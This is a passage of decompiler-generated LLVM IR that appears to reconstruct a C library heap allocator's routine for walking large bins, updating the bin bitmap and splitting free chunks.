dec_label_pc_16454:                               ; preds = %dec_label_pc_16448
  %v1_16454 = load i32, i32* @sb, align 4
  %tmp241 = icmp ugt i32 %v1_16434, %v1_16454
  br i1 %tmp241, label %dec_label_pc_1645c, label %dec_label_pc_16494

dec_label_pc_1645c:                               ; preds = %dec_label_pc_16454
  %v2_1645c = sub i32 %v1_16434, %v1_16494
  store i32 %v2_1645c, i32* @r2, align 4
  %v2_16460 = add i32 %v0_1646c, %v1_16494
  store i32 %v2_16460, i32* %r3.global-to-local, align 4
  %v1_16464 = or i32 %v1_16494, 1
  store i32 %v1_16464, i32* %r0.global-to-local, align 4
  %v1_16468 = or i32 %v2_1645c, 1
  store i32 %v1_16468, i32* %r1.global-to-local, align 4
  %v1_1646c = add i32 %v0_1646c, 8
  store i32 %v1_1646c, i32* %r4.global-to-local, align 4
  %v2_16470 = add i32 %v0_16498, 8
  %v3_16470 = inttoptr i32 %v2_16470 to i32*
  store i32 %v2_16460, i32* %v3_16470, align 4
  %v0_16474 = load i32, i32* %r3.global-to-local, align 4
  %v1_16474 = load i32, i32* @ip, align 4
  %v2_16474 = add i32 %v1_16474, 12
  %v3_16474 = inttoptr i32 %v2_16474 to i32*
  store i32 %v0_16474, i32* %v3_16474, align 4
  %v0_16478 = load i32, i32* %r0.global-to-local, align 4
  %v1_16478 = load i32, i32* @r7, align 4
  %v2_16478 = add i32 %v1_16478, 4
  %v3_16478 = inttoptr i32 %v2_16478 to i32*
  store i32 %v0_16478, i32* %v3_16478, align 4
  %v0_1647c = load i32, i32* %r3.global-to-local, align 4
  %v1_1647c = load i32, i32* %r6.global-to-local, align 4
  %v2_1647c = add i32 %v1_1647c, 48
  %v3_1647c = inttoptr i32 %v2_1647c to i32*
  store i32 %v0_1647c, i32* %v3_1647c, align 4
  %v0_16480 = load i32, i32* @r2, align 4
  %v1_16480 = load i32, i32* %r3.global-to-local, align 4
  %v3_16480 = add i32 %v1_16480, %v0_16480
  %v4_16480 = inttoptr i32 %v3_16480 to i32*
  store i32 %v0_16480, i32* %v4_16480, align 4
  %v0_16484 = load i32, i32* %r1.global-to-local, align 4
  %v1_16484 = load i32, i32* %r3.global-to-local, align 4
  %v2_16484 = add i32 %v1_16484, 4
  %v3_16484 = inttoptr i32 %v2_16484 to i32*
  store i32 %v0_16484, i32* %v3_16484, align 4
  %v0_16488 = load i32, i32* @ip, align 4
  %v1_16488 = load i32, i32* %r3.global-to-local, align 4
  %v2_16488 = add i32 %v1_16488, 12
  %v3_16488 = inttoptr i32 %v2_16488 to i32*
  store i32 %v0_16488, i32* %v3_16488, align 4
  %v0_1648c = load i32, i32* @ip, align 4
  %v1_1648c = load i32, i32* %r3.global-to-local, align 4
  %v2_1648c = add i32 %v1_1648c, 8
  %v3_1648c = inttoptr i32 %v2_1648c to i32*
  store i32 %v0_1648c, i32* %v3_1648c, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16494:                               ; preds = %dec_label_pc_16454, %dec_label_pc_16448, %dec_label_pc_16440, %dec_label_pc_1642c
  %v9_16494 = icmp eq i32 %v1_16434, %v1_16494
  %v2_16498 = add i32 %v3_16438, 8
  %v3_16498 = inttoptr i32 %v2_16498 to i32*
  store i32 %v0_16498, i32* %v3_16498, align 4
  %v0_1649c = load i32, i32* @ip, align 4
  %v1_1649c = load i32, i32* %r5.global-to-local, align 4
  %v2_1649c = add i32 %v1_1649c, 12
  %v3_1649c = inttoptr i32 %v2_1649c to i32*
  store i32 %v0_1649c, i32* %v3_1649c, align 4
  br i1 %v9_16494, label %dec_label_pc_165d0.loopexit, label %dec_label_pc_164b0

dec_label_pc_164b0:                               ; preds = %dec_label_pc_16494
  %v0_164b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_164b0 = icmp ugt i32 %v0_164b0, 254
  %v7_164b0 = icmp eq i32 %v0_164b0, 255
  %v2_164b4 = xor i1 %v2_164b0, true
  %v3_164b4 = or i1 %v7_164b0, %v2_164b4
  br i1 %v3_164b4, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_164b0
  %v5_164b4 = and i32 %v0_164b0, 4
  %v6_164b4 = icmp ne i32 %v5_164b4, 0
  %v7_164b4 = udiv i32 %v0_164b0, 8
  store i32 %v7_164b4, i32* %r0.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_164b0, %bb165
  %v1_164b8 = phi i1 [ %v2_164b0, %dec_label_pc_164b0 ], [ %v6_164b4, %bb165 ]
  %v2_164b8 = xor i1 %v1_164b8, true
  %v3_164b8 = or i1 %v7_164b0, %v2_164b8
  br i1 %v3_164b8, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v4_164b8 = load i32, i32* %r6.global-to-local, align 4
  %v5_164b8 = load i32, i32* %r0.global-to-local, align 4
  %v6_164b8 = and i32 %v5_164b8, 536870912
  %v7_164b8 = icmp ne i32 %v6_164b8, 0
  %v8_164b8 = mul i32 %v5_164b8, 8
  %v9_164b8 = add i32 %v8_164b8, %v4_164b8
  store i32 %v9_164b8, i32* %r3.global-to-local, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v1_164c4 = phi i1 [ %v1_164b8, %bb166 ], [ %v7_164b8, %bb167 ]
  %v2_164bc = xor i1 %v1_164c4, true
  %v3_164bc = or i1 %v7_164b0, %v2_164bc
  br i1 %v3_164bc, label %.dec_label_pc_16518_crit_edge, label %dec_label_pc_164c8

.dec_label_pc_16518_crit_edge:                    ; preds = %bb168
  %v4_164bc = load i32, i32* %r3.global-to-local, align 4
  %v5_164bc = add i32 %v4_164bc, 44
  store i32 %v5_164bc, i32* %ip.global-to-local, align 4
  %v5_164c0 = add i32 %v4_164bc, 52
  %v6_164c0 = inttoptr i32 %v5_164c0 to i32*
  %v7_164c0 = load i32, i32* %v6_164c0, align 4
  store i32 %v7_164c0, i32* %lr.global-to-local, align 4
  %v0_16518.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_1651c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16518

dec_label_pc_164c8:                               ; preds = %bb168
  store i32 %v0_164b0, i32* %r0.global-to-local, align 4
  %v1_164cc = call i32 @__malloc_largebin_index(i32 %v0_164b0)
  store i32 %v1_164cc, i32* %r0.global-to-local, align 4
  %v0_164d0 = load i32, i32* %r6.global-to-local, align 4
  %v4_164d0 = mul i32 %v1_164cc, 8
  %v5_164d0 = add i32 %v0_164d0, %v4_164d0
  store i32 %v5_164d0, i32* %r3.global-to-local, align 4
  %v1_164d4 = add i32 %v5_164d0, 44
  store i32 %v1_164d4, i32* %ip.global-to-local, align 4
  %v1_164d8 = add i32 %v5_164d0, 52
  %v2_164d8 = inttoptr i32 %v1_164d8 to i32*
  %v3_164d8 = load i32, i32* %v2_164d8, align 4
  store i32 %v3_164d8, i32* %lr.global-to-local, align 4
  %v9_164dc = icmp eq i32 %v3_164d8, %v1_164d4
  br i1 %v9_164dc, label %dec_label_pc_16518, label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %dec_label_pc_164c8
  %v1_164e4 = add i32 %v5_164d0, 56
  %v2_164e4 = inttoptr i32 %v1_164e4 to i32*
  %v3_164e4 = load i32, i32* %v2_164e4, align 4
  store i32 %v3_164e4, i32* %r2.global-to-local, align 4
  %v1_164e8 = add i32 %v3_164e4, 4
  %v2_164e8 = inttoptr i32 %v1_164e8 to i32*
  %v3_164e8 = load i32, i32* %v2_164e8, align 4
  store i32 %v3_164e8, i32* %r3.global-to-local, align 4
  %v0_164ec = load i32, i32* %r4.global-to-local, align 4
  %v3_164ec = icmp ult i32 %v0_164ec, %v3_164e8
  br i1 %v3_164ec, label %.thread, label %dec_label_pc_16508.preheader

.thread:                                          ; preds = %dec_label_pc_164e4
  store i32 %v1_164d4, i32* %lr.global-to-local, align 4
  store i32 %v3_164e4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16518

dec_label_pc_16508.preheader:                     ; preds = %dec_label_pc_164e4
  %v2_164f4 = or i32 %v0_164ec, 1
  store i32 %v2_164f4, i32* %r2.global-to-local, align 4
  %v1_16508211 = add i32 %v3_164d8, 4
  %v2_16508212 = inttoptr i32 %v1_16508211 to i32*
  %v3_16508213 = load i32, i32* %v2_16508212, align 4
  store i32 %v3_16508213, i32* %r3.global-to-local, align 4
  %v3_1650c215 = icmp ult i32 %v2_164f4, %v3_16508213
  br i1 %v3_1650c215, label %dec_label_pc_16504, label %dec_label_pc_16514

dec_label_pc_16504:                               ; preds = %dec_label_pc_16508.preheader, %dec_label_pc_16504
  %v0_16514216 = phi i32 [ %v3_16504, %dec_label_pc_16504 ], [ %v3_164d8, %dec_label_pc_16508.preheader ]
  %v1_16504 = add i32 %v0_16514216, 8
  %v2_16504 = inttoptr i32 %v1_16504 to i32*
  %v3_16504 = load i32, i32* %v2_16504, align 4
  store i32 %v3_16504, i32* %lr.global-to-local, align 4
  %v1_16508 = add i32 %v3_16504, 4
  %v2_16508 = inttoptr i32 %v1_16508 to i32*
  %v3_16508 = load i32, i32* %v2_16508, align 4
  store i32 %v3_16508, i32* %r3.global-to-local, align 4
  %v3_1650c = icmp ult i32 %v2_164f4, %v3_16508
  br i1 %v3_1650c, label %dec_label_pc_16504, label %dec_label_pc_16514

dec_label_pc_16514:                               ; preds = %dec_label_pc_16504, %dec_label_pc_16508.preheader
  %v0_16514.lcssa = phi i32 [ %v3_164d8, %dec_label_pc_16508.preheader ], [ %v3_16504, %dec_label_pc_16504 ]
  %v1_16514 = add i32 %v0_16514.lcssa, 12
  %v2_16514 = inttoptr i32 %v1_16514 to i32*
  %v3_16514 = load i32, i32* %v2_16514, align 4
  store i32 %v3_16514, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16518

dec_label_pc_16518:                               ; preds = %.thread, %.dec_label_pc_16518_crit_edge, %dec_label_pc_164c8, %dec_label_pc_16514
  %v0_1652c = phi i32 [ %v5_164bc, %.dec_label_pc_16518_crit_edge ], [ %v1_164d4, %dec_label_pc_164c8 ], [ %v3_16514, %dec_label_pc_16514 ], [ %v3_164e4, %.thread ]
  %v0_1651c = phi i32 [ %v0_1651c.pre, %.dec_label_pc_16518_crit_edge ], [ %v0_164d0, %dec_label_pc_164c8 ], [ %v0_164d0, %dec_label_pc_16514 ], [ %v0_164d0, %.thread ]
  %v0_16524 = phi i32 [ %v0_16518.pre, %.dec_label_pc_16518_crit_edge ], [ %v1_164cc, %dec_label_pc_164c8 ], [ %v1_164cc, %dec_label_pc_16514 ], [ %v1_164cc, %.thread ]
  %v3_16518 = sdiv i32 %v0_16524, 32
  %v4_1651c = mul nsw i32 %v3_16518, 4
  %v5_1651c = add i32 %v4_1651c, %v0_1651c
  store i32 %v5_1651c, i32* %r3.global-to-local, align 4
  %v1_16520 = add i32 %v5_1651c, 820
  %v2_16520 = inttoptr i32 %v1_16520 to i32*
  %v3_16520 = load i32, i32* %v2_16520, align 4
  %v1_16524 = urem i32 %v0_16524, 32
  store i32 %v1_16524, i32* %r1.global-to-local, align 4
  %v1_16528 = load i32, i32* @fp, align 4
  %v7_16528 = shl i32 %v1_16528, %v1_16524
  %v8_16528 = or i32 %v7_16528, %v3_16520
  store i32 %v8_16528, i32* %r2.global-to-local, align 4
  %v1_1652c = load i32, i32* @r7, align 4
  %v2_1652c = add i32 %v1_1652c, 12
  %v3_1652c = inttoptr i32 %v2_1652c to i32*
  store i32 %v0_1652c, i32* %v3_1652c, align 4
  %v0_16530 = load i32, i32* %lr.global-to-local, align 4
  %v1_16530 = load i32, i32* @r7, align 4
  %v2_16530 = add i32 %v1_16530, 8
  %v3_16530 = inttoptr i32 %v2_16530 to i32*
  store i32 %v0_16530, i32* %v3_16530, align 4
  %v0_16534 = load i32, i32* %r2.global-to-local, align 4
  %v1_16534 = load i32, i32* %r3.global-to-local, align 4
  %v2_16534 = add i32 %v1_16534, 820
  %v3_16534 = inttoptr i32 %v2_16534 to i32*
  store i32 %v0_16534, i32* %v3_16534, align 4
  %v0_16538 = load i32, i32* @r7, align 4
  %v1_16538 = load i32, i32* %lr.global-to-local, align 4
  %v2_16538 = add i32 %v1_16538, 12
  %v3_16538 = inttoptr i32 %v2_16538 to i32*
  store i32 %v0_16538, i32* %v3_16538, align 4
  %v0_1653c = load i32, i32* @r7, align 4
  %v1_1653c = load i32, i32* %ip.global-to-local, align 4
  %v2_1653c = add i32 %v1_1653c, 8
  %v3_1653c = inttoptr i32 %v2_1653c to i32*
  store i32 %v0_1653c, i32* %v3_1653c, align 4
  %v3_16554 = load i32, i32* @global_var_3475c.1430, align 4
  store i32 %v3_16554, i32* @r7, align 4
  %v1_16558 = load i32, i32* %r5.global-to-local, align 4
  %v9_16558 = icmp eq i32 %v3_16554, %v1_16558
  %v0_16560.pre = load i32, i32* @sl, align 4
  br i1 %v9_16558, label %dec_label_pc_16560, label %dec_label_pc_1642c

dec_label_pc_16544:                               ; preds = %dec_label_pc_1640c, %dec_label_pc_163cc, %dec_label_pc_16420
  store i32 ptrtoint (i32* @global_var_34750.1429 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %r6.global-to-local, align 4
  %v0_1654c = load i32, i32* @sl, align 4
  %v1_1654c = add i32 %v0_1654c, 16
  store i32 %v1_1654c, i32* @sb, align 4
  store i32 1, i32* @fp, align 4
  %v3_1655458 = load i32, i32* @global_var_3475c.1430, align 4
  store i32 %v3_1655458, i32* @r7, align 4
  %v9_1655867 = icmp eq i32 %v3_1655458, ptrtoint (i32* @global_var_34750.1429 to i32)
  br i1 %v9_1655867, label %dec_label_pc_16560, label %dec_label_pc_1642c

dec_label_pc_16560:                               ; preds = %dec_label_pc_16518, %dec_label_pc_16544
  %v0_16568 = phi i32 [ ptrtoint (i32* @global_var_34750.1429 to i32), %dec_label_pc_16544 ], [ %v3_16554, %dec_label_pc_16518 ]
  %v0_16560 = phi i32 [ %v0_1654c, %dec_label_pc_16544 ], [ %v0_16560.pre, %dec_label_pc_16518 ]
  %tmp242 = icmp ult i32 %v0_16560, 256
  %v0_16618.pre = load i32, i32* @r8, align 4
  br i1 %tmp242, label %dec_label_pc_16560.dec_label_pc_16618_crit_edge, label %dec_label_pc_16568

dec_label_pc_16560.dec_label_pc_16618_crit_edge:  ; preds = %dec_label_pc_16560
  %.pre237 = mul i32 %v0_16618.pre, 8
  br label %dec_label_pc_16618

dec_label_pc_16568:                               ; preds = %dec_label_pc_16560
  %v4_16568 = mul i32 %v0_16618.pre, 8
  %v5_16568 = add i32 %v4_16568, %v0_16568
  store i32 %v5_16568, i32* %r3.global-to-local, align 4
  %v1_1656c = add i32 %v5_16568, -8
  store i32 %v1_1656c, i32* %r1.global-to-local, align 4
  %v1_16570 = add i32 %v5_16568, 4
  %v2_16570 = inttoptr i32 %v1_16570 to i32*
  %storemerge.pre = load i32, i32* %v2_16570, align 4
  br label %dec_label_pc_16610

dec_label_pc_16578:                               ; preds = %dec_label_pc_16610
  %v1_16578 = add i32 %v1_165a0, 4
  %v2_16578 = inttoptr i32 %v1_16578 to i32*
  %v3_16578 = load i32, i32* %v2_16578, align 4
  store i32 %v3_16578, i32* %r3.global-to-local, align 4
  %v1_1657c = and i32 %v3_16578, -4
  store i32 %v1_1657c, i32* %r2.global-to-local, align 4
  %v3_16580 = icmp ult i32 %v1_1657c, %v0_16560
  %v1_16584 = add i32 %v1_165a0, 12
  %v2_16584 = inttoptr i32 %v1_16584 to i32*
  %v3_16584 = load i32, i32* %v2_16584, align 4
  store i32 %v3_16584, i32* %r0.global-to-local, align 4
  br i1 %v3_16580, label %dec_label_pc_16610, label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %dec_label_pc_16578
  %v1_1658c = add i32 %v1_165a0, 8
  %v2_1658c = inttoptr i32 %v1_1658c to i32*
  %v3_1658c = load i32, i32* %v2_1658c, align 4
  store i32 %v3_1658c, i32* %r1.global-to-local, align 4
  %v1_16590 = add i32 %v3_1658c, 12
  %v2_16590 = inttoptr i32 %v1_16590 to i32*
  %v3_16590 = load i32, i32* %v2_16590, align 4
  store i32 %v3_16590, i32* %r3.global-to-local, align 4
  %v9_16594 = icmp eq i32 %v3_16590, %v1_165a0
  br i1 %v9_16594, label %dec_label_pc_1659c, label %dec_label_pc_165a8

dec_label_pc_1659c:                               ; preds = %dec_label_pc_1658c
  %v1_1659c = add i32 %v3_16584, 8
  %v2_1659c = inttoptr i32 %v1_1659c to i32*
  %v3_1659c = load i32, i32* %v2_1659c, align 4
  store i32 %v3_1659c, i32* %r3.global-to-local, align 4
  %v9_165a0 = icmp eq i32 %v3_1659c, %v1_165a0
  br i1 %v9_165a0, label %dec_label_pc_165ac, label %dec_label_pc_165a8

dec_label_pc_165a8:                               ; preds = %dec_label_pc_1658c, %dec_label_pc_1659c
  %v0_165a8 = call i32 @abort()
  store i32 %v0_165a8, i32* %r0.global-to-local, align 4
  %v0_165ac.pre = load i32, i32* @sl, align 4
  %v1_165ac.pre = load i32, i32* @r2, align 4
  %v0_165b4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_165ac

dec_label_pc_165ac:                               ; preds = %dec_label_pc_1659c, %dec_label_pc_165a8
  %v1_165b4 = phi i32 [ %v3_16584, %dec_label_pc_1659c ], [ %v0_165a8, %dec_label_pc_165a8 ]
  %v0_165b4 = phi i32 [ %v3_1658c, %dec_label_pc_1659c ], [ %v0_165b4.pre, %dec_label_pc_165a8 ]
  %v1_165ac = phi i32 [ %v1_1657c, %dec_label_pc_1659c ], [ %v1_165ac.pre, %dec_label_pc_165a8 ]
  %v0_165ac = phi i32 [ %v0_16560, %dec_label_pc_1659c ], [ %v0_165ac.pre, %dec_label_pc_165a8 ]
  %v2_165ac = sub i32 %v1_165ac, %v0_165ac
  store i32 %v2_165ac, i32* %lr.global-to-local, align 4
  %v2_165b4 = add i32 %v1_165b4, 8
  %v3_165b4 = inttoptr i32 %v2_165b4 to i32*
  store i32 %v0_165b4, i32* %v3_165b4, align 4
  %v0_165b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_165b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_165b8 = add i32 %v1_165b8, 12
  %v3_165b8 = inttoptr i32 %v2_165b8 to i32*
  store i32 %v0_165b8, i32* %v3_165b8, align 4
  %v0_165bc = load i32, i32* @ip, align 4
  %v1_165bc = add i32 %v0_165bc, 8
  store i32 %v1_165bc, i32* %r0.global-to-local, align 4
  %tmp243 = icmp ugt i32 %v2_165ac, 15
  br i1 %tmp243, label %dec_label_pc_165dc, label %dec_label_pc_165c4

dec_label_pc_165c4:                               ; preds = %dec_label_pc_165ac
  %v1_165c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_165c4 = add i32 %v1_165c4, %v0_165bc
  store i32 %v2_165c4, i32* @r2, align 4
  %v1_165c8 = add i32 %v2_165c4, 4
  %v2_165c8 = inttoptr i32 %v1_165c8 to i32*
  %v3_165c8 = load i32, i32* %v2_165c8, align 4
  store i32 %v3_165c8, i32* %r3.global-to-local, align 4
  store i32 %v1_165bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165d0

dec_label_pc_165d0.loopexit:                      ; preds = %dec_label_pc_16494
  %v1_164a0 = load i32, i32* @r7, align 4
  %v2_164a0 = load i32, i32* @sl, align 4
  %v3_164a0 = add i32 %v2_164a0, %v1_164a0
  store i32 %v3_164a0, i32* @r2, align 4
  %v2_164a4 = add i32 %v3_164a0, 4
  %v3_164a4 = inttoptr i32 %v2_164a4 to i32*
  %v4_164a4 = load i32, i32* %v3_164a4, align 4
  store i32 %v4_164a4, i32* %r3.global-to-local, align 4
  %v2_164a8 = add i32 %v1_164a0, 8
  store i32 %v2_164a8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165d0

dec_label_pc_165d0:                               ; preds = %.dec_label_pc_165d0_crit_edge, %dec_label_pc_165d0.loopexit, %dec_label_pc_165c4
  %v1_165d4 = phi i32 [ %v4_166d8, %.dec_label_pc_165d0_crit_edge ], [ %v3_164a0, %dec_label_pc_165d0.loopexit ], [ %v2_165c4, %dec_label_pc_165c4 ]
  %v0_165d0 = phi i32 [ %v7_166d8, %.dec_label_pc_165d0_crit_edge ], [ %v4_164a4, %dec_label_pc_165d0.loopexit ], [ %v3_165c8, %dec_label_pc_165c4 ]
  %v1_165d0 = or i32 %v0_165d0, 1
  store i32 %v1_165d0, i32* %r3.global-to-local, align 4
  %v2_165d4 = add i32 %v1_165d4, 4
  %v3_165d4 = inttoptr i32 %v2_165d4 to i32*
  store i32 %v1_165d0, i32* %v3_165d4, align 4
  br label %dec_label_pc_16b20

dec_label_pc_165dc:                               ; preds = %dec_label_pc_165ac
  %v1_165dc = load i32, i32* @sl, align 4
  %v2_165dc = add i32 %v1_165dc, %v0_165bc
  store i32 %v2_165dc, i32* @r2, align 4
  %v1_165e0 = or i32 %v1_165dc, 1
  store i32 %v1_165e0, i32* %r3.global-to-local, align 4
  %v0_165e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_165e4 = or i32 %v0_165e4, 1
  store i32 %v1_165e4, i32* %r1.global-to-local, align 4
  store i32 %v1_165bc, i32* %r4.global-to-local, align 4
  %v2_165ec = add i32 %v0_165bc, 4
  %v3_165ec = inttoptr i32 %v2_165ec to i32*
  store i32 %v1_165e0, i32* %v3_165ec, align 4
  %v0_165f0 = load i32, i32* @r2, align 4
  %v1_165f0 = load i32, i32* @r7, align 4
  %v2_165f0 = add i32 %v1_165f0, 8
  %v3_165f0 = inttoptr i32 %v2_165f0 to i32*
  store i32 %v0_165f0, i32* %v3_165f0, align 4
  %v0_165f4 = load i32, i32* @r2, align 4
  %v1_165f4 = load i32, i32* @r7, align 4
  %v2_165f4 = add i32 %v1_165f4, 12
  %v3_165f4 = inttoptr i32 %v2_165f4 to i32*
  store i32 %v0_165f4, i32* %v3_165f4, align 4
  %v0_165f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_165f8 = load i32, i32* @r2, align 4
  %v3_165f8 = add i32 %v1_165f8, %v0_165f8
  %v4_165f8 = inttoptr i32 %v3_165f8 to i32*
  store i32 %v0_165f8, i32* %v4_165f8, align 4
  %v0_165fc = load i32, i32* %r1.global-to-local, align 4
  %v1_165fc = load i32, i32* @r2, align 4
  %v2_165fc = add i32 %v1_165fc, 4
  %v3_165fc = inttoptr i32 %v2_165fc to i32*
  store i32 %v0_165fc, i32* %v3_165fc, align 4
  %v0_16600 = load i32, i32* @r7, align 4
  %v1_16600 = load i32, i32* @r2, align 4
  %v2_16600 = add i32 %v1_16600, 12
  %v3_16600 = inttoptr i32 %v2_16600 to i32*
  store i32 %v0_16600, i32* %v3_16600, align 4
  %v0_16604 = load i32, i32* @r7, align 4
  %v1_16604 = load i32, i32* @r2, align 4
  %v2_16604 = add i32 %v1_16604, 8
  %v3_16604 = inttoptr i32 %v2_16604 to i32*
  store i32 %v0_16604, i32* %v3_16604, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16610:                               ; preds = %dec_label_pc_16578, %dec_label_pc_16568
  %v1_165a0 = phi i32 [ %storemerge.pre, %dec_label_pc_16568 ], [ %v3_16584, %dec_label_pc_16578 ]
  store i32 %v1_165a0, i32* @ip, align 4
  %v9_16610 = icmp eq i32 %v1_165a0, %v1_1656c
  br i1 %v9_16610, label %dec_label_pc_16618.loopexit, label %dec_label_pc_16578

dec_label_pc_16618.loopexit:                      ; preds = %dec_label_pc_16610
  br label %dec_label_pc_16618

dec_label_pc_16618:                               ; preds = %dec_label_pc_16560.dec_label_pc_16618_crit_edge, %dec_label_pc_16618.loopexit
  %v4_1663c.pre-phi = phi i32 [ %.pre237, %dec_label_pc_16560.dec_label_pc_16618_crit_edge ], [ %v4_16568, %dec_label_pc_16618.loopexit ]
  %v1_16618 = add i32 %v0_16618.pre, 1
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %r1.global-to-local, align 4
  %v1_16620 = urem i32 %v1_16618, 32
  %v3_16624 = udiv i32 %v1_16618, 32
  store i32 %v3_16624, i32* @r6, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v6_1662c = shl i32 1, %v1_16620
  store i32 %v6_1662c, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_34750.1429 to i32), i32* %r2.global-to-local, align 4
  %v4_16634 = mul nuw nsw i32 %v3_16624, 4
  %v5_16634 = add i32 %v4_16634, ptrtoint (i32* @global_var_3471c.1425 to i32)
  store i32 %v5_16634, i32* %r3.global-to-local, align 4
  %v1_16638 = add i32 %v4_16634, add (i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32 820)
  %v2_16638 = inttoptr i32 %v1_16638 to i32*
  %v3_16638 = load i32, i32* %v2_16638, align 4
  store i32 %v3_16638, i32* @r5, align 4
  %v5_1663c = add i32 %v4_1663c.pre-phi, ptrtoint (i32* @global_var_34750.1429 to i32)
  store i32 %v5_1663c, i32* @r4, align 4
  br label %dec_label_pc_16640

dec_label_pc_16640:                               ; preds = %dec_label_pc_166a0, %dec_label_pc_16618
  %v1_16648 = phi i32 [ %v1_16648.pre, %dec_label_pc_166a0 ], [ %v3_16638, %dec_label_pc_16618 ]
  %v0_16648 = phi i32 [ %v0_16640.pre, %dec_label_pc_166a0 ], [ %v6_1662c, %dec_label_pc_16618 ]
  %v1_16640 = sub i32 1, %v0_16648
  %v2_16640 = icmp ult i32 %v0_16648, 2
  %v1_16640. = select i1 %v2_16640, i32 %v1_16640, i32 0
  store i32 %v1_16640., i32* %r3.global-to-local, align 4
  %tmp169 = icmp ugt i32 %v0_16648, %v1_16648
  br i1 %tmp169, label %.thread12, label %bb170

.thread12:                                        ; preds = %dec_label_pc_16640
  %v5_1664c = or i32 %v1_16640., 1
  store i32 %v5_1664c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16658.preheader

bb170:                                            ; preds = %dec_label_pc_16640
  %v2_16650 = icmp eq i32 %v1_16640., 0
  br i1 %v2_16650, label %.dec_label_pc_1668c.preheader_crit_edge, label %dec_label_pc_16658.preheader

.dec_label_pc_1668c.preheader_crit_edge:          ; preds = %bb170
  %v0_1668456.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1668c.preheader

dec_label_pc_16658.preheader:                     ; preds = %bb170, %.thread12
  %v0_16658.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16658

dec_label_pc_16658:                               ; preds = %dec_label_pc_16658.preheader, %dec_label_pc_16664
  %v0_16658 = phi i32 [ %v0_16658.pre, %dec_label_pc_16658.preheader ], [ %v1_16658, %dec_label_pc_16664 ]
  %v1_16658 = add i32 %v0_16658, 1
  store i32 %v1_16658, i32* @r6, align 4
  %tmp244 = icmp ugt i32 %v1_16658, 2
  br i1 %tmp244, label %dec_label_pc_16720.loopexit, label %dec_label_pc_16664

dec_label_pc_16664:                               ; preds = %dec_label_pc_16658
  %v0_16664 = load i32, i32* %r1.global-to-local, align 4
  %v4_16664 = mul i32 %v1_16658, 4
  %v5_16664 = add i32 %v0_16664, %v4_16664
  store i32 %v5_16664, i32* %r3.global-to-local, align 4
  %v1_16668 = add i32 %v5_16664, 820
  %v2_16668 = inttoptr i32 %v1_16668 to i32*
  %v3_16668 = load i32, i32* %v2_16668, align 4
  store i32 %v3_16668, i32* @r5, align 4
  %v2_1666c = icmp eq i32 %v3_16668, 0
  br i1 %v2_1666c, label %dec_label_pc_16658, label %dec_label_pc_16674

dec_label_pc_16674:                               ; preds = %dec_label_pc_16664
  %v0_16674 = load i32, i32* %r2.global-to-local, align 4
  %v4_16674 = mul i32 %v1_16658, 256
  %v5_16674 = add i32 %v0_16674, %v4_16674
  store i32 %v5_16674, i32* %r3.global-to-local, align 4
  %v1_16678 = add i32 %v5_16674, -8
  store i32 %v1_16678, i32* @r4, align 4
  %v0_1667c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1667c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1668c.preheader

dec_label_pc_1668c.preheader:                     ; preds = %.dec_label_pc_1668c.preheader_crit_edge, %dec_label_pc_16674
  %v0_1668456 = phi i32 [ %v1_16678, %dec_label_pc_16674 ], [ %v0_1668456.pre, %.dec_label_pc_1668c.preheader_crit_edge ]
  %v0_166a0 = phi i32 [ %v3_16668, %dec_label_pc_16674 ], [ %v1_16648, %.dec_label_pc_1668c.preheader_crit_edge ]
  %lr.promoted = phi i32 [ %v0_1667c, %dec_label_pc_16674 ], [ %v0_16648, %.dec_label_pc_1668c.preheader_crit_edge ]
  %v2_1668c53 = and i32 %lr.promoted, %v0_166a0
  %v4_1668c55 = icmp eq i32 %v2_1668c53, 0
  br i1 %v4_1668c55, label %dec_label_pc_16684, label %dec_label_pc_16694

dec_label_pc_16684:                               ; preds = %dec_label_pc_1668c.preheader, %dec_label_pc_16684
  %v2_1668868 = phi i32 [ %v2_16688, %dec_label_pc_16684 ], [ %lr.promoted, %dec_label_pc_1668c.preheader ]
  %v0_1668457 = phi i32 [ %v1_16684, %dec_label_pc_16684 ], [ %v0_1668456, %dec_label_pc_1668c.preheader ]
  %v1_16684 = add i32 %v0_1668457, 8
  %v2_16688 = mul i32 %v2_1668868, 2
  %v2_1668c = and i32 %v2_16688, %v0_166a0
  %v4_1668c = icmp eq i32 %v2_1668c, 0
  br i1 %v4_1668c, label %dec_label_pc_16684, label %dec_label_pc_1668c.dec_label_pc_16694_crit_edge

dec_label_pc_1668c.dec_label_pc_16694_crit_edge:  ; preds = %dec_label_pc_16684
  store i32 %v1_16684, i32* @r4, align 4
  store i32 %v2_16688, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16694

dec_label_pc_16694:                               ; preds = %dec_label_pc_1668c.dec_label_pc_16694_crit_edge, %dec_label_pc_1668c.preheader
